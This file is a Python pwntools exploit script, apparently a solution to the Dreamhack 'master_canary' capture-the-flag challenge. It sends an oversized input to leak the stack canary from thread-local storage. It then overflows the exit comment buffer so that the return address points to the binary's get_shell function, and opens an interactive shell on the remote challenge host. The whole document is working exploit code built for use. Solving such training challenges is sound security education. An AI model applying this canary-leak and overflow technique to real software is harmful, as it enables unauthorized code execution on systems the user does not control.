#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./master_canary")
p = remote("host1.dreamhack.games", 24399)
elf = ELF("./master_canary")
get_shell = elf.symbols['get_shell']

def Create_thread():
    p.sendlineafter("> ", '1')

def Input(size, data):
    p.sendlineafter("> ", '2')
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def Exit(data):
    p.sendlineafter("> ", '3')
    p.sendafter("Leave comment: ", data)

log.info("get_shell: " + hex(get_shell))

Create_thread()

Input(0x8e8+1, 'A'*0x8e8 + 'B')
#gdb.attach(p, 'b*main')
p.recvuntil('A'*0x8e8+'B')
canary = u64('\x00' + p.recv(7))
log.info("canary: " + hex(canary))

Exit('A'*0x28 + p64(canary) + 'C'*8 + p64(get_shell))


p.interactive()

